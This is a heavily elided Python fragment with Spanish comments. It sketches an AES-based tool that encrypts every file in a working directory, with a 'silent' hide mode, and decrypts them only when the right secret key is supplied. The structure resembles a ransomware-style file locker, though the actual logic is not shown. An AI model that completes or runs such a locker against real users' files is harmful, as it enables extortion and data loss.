...
# Clase definida con dos funciones: encrypt y decrypt
class AESCipher:
...
def encrypt_directory(hide_mode):  
    
    file_list = pathlib.Path(working_dir)
...
def main():
    ...
    if os.path.exists(working_dir):
        ...
        if args.secret_key == None:
            encrypt_directory(args.silent)   
        elif args.secret_key ==  pwd:
            desencrypt_directory()
        else:
            print(banner)
